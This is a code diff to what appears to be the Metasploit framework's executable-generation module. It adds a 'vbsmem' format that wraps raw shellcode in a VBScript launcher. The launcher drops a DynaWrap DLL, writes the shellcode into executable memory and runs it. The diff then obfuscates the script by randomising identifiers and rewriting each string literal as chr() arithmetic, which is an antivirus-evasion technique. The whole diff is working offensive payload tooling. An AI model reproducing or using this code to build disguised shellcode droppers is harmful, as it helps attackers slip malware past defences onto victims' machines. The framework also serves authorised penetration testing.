@@ -713,6 +713,50 @@ require 'digest/sha1'
 		return elf
 	end
 
+	def self.to_win32_vbsmem(framework, code, opts={})
+		set_template_default(opts, "vbsmem.vbs")
+		payload = Msf::Simple::Buffer::transform(code, fmt='js_le')
+		s = "sShellCode = Unescape(\"#{payload}\")\n"
+		vbs_template = ''
+		File.open(opts[:template], 'rb') { |fd|
+			vbs_template = fd.read(fd.stat.size)
+		}
+		s << vbs_template
+		if (1) 
+			identifiers = [
+			'sShellCode', 'GetBSTRPtr', 'oSCat', 'oMM', 'pSource', 'pDest', 
+			'MEM_COMMIT', 'PAGE_EXECUTE_READWRITE', 'lBytesWritten', 'pBytesWritten', 
+			'pShellCode', 'oApi', 'lpMemory', 'lResult', 'sDynaWrap', 'FSO', 'tmpDir', 
+			'dllName', 'dllFile', 'exitCode', 'WSH', 'DropDynaWrapDll', 
+			'ExecuteShellCode', 'DumpFile', 'DumpFile1', 'objFSO', 'objFile', 
+			'WriteBytes', 'strBytes', 'aNumbers', 'iIter', 'oShell', 'clsId', 
+			'typeLibId', 'regRoot', 'stubId', 'RegisterDynaWrapDll', 'dllPath', 
+			'sData', 'payloadVar'
+			]	
+			# obfuscate identifiers
+			identifiers.each do |id|
+				s.gsub!(id, Rex::Text.rand_text_alpha(rand(4)+4))
+			end	
+			# remove blank lines and indentation
+			r = ''
+			s.each_line do |line|
+				line = line.strip()
+				if line != ''
+					r << line + "\n"
+				end
+			end
+			s = r
+			# obfuscate fixed strings
+			s.gsub!(/".+?"/) do |quoted|
+				quoted.delete('"').each_byte.map do |x|
+					y=rand(x/2).to_i
+					"chr(#{x-y}+#{y})"
+				end.join("+")
+			end
+		end
+		s
+	end
+	
 	def self.to_exe_vba(exes='')
 		exe = exes.unpack('C*')
 		vba = ""
@@ -1895,6 +1939,9 @@ End Sub
 			if (arch and (arch.index(ARCH_X86_64) or arch.index(ARCH_X64)))
 				output = Msf::Util::EXE.to_osx_x64_macho(framework, code, exeopts)
 			end
+			
+		when 'vbsmem'
+				output = Msf::Util::EXE.to_win32_vbsmem(framework, code, exeopts)
 
 		when 'vba'
 			output = Msf::Util::EXE.to_vba(framework, code, exeopts)
@@ -1934,7 +1981,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','vbsmem','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
